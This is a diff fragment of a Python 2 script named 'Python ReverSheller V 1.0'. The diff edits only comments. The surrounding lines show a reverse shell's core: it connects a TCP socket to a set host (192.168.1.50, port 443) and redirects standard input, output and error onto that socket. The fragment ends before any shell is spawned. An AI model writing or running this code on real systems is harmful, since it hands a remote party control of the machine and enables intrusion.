@@ -19,11 +19,11 @@ rhost = '192.168.1.50' # Set here different Host to connect
 rport =  443           # Set here different Port to connect
 
 print "< Python ReverSheller V 1.0>" # Simple banner
-print "[+] Connection set on",rhost,":",rport ########
+print "[+] Connection set on",rhost,":",rport #Print connection set on IP & Port
 print "[+] Running ..." #########################
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # TCP_Socket_Variable
-s.connect((rhost , rport))                            # Socket_Connection
+s.connect((rhost , rport))                            # Socket_Connection on Global_Variables
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
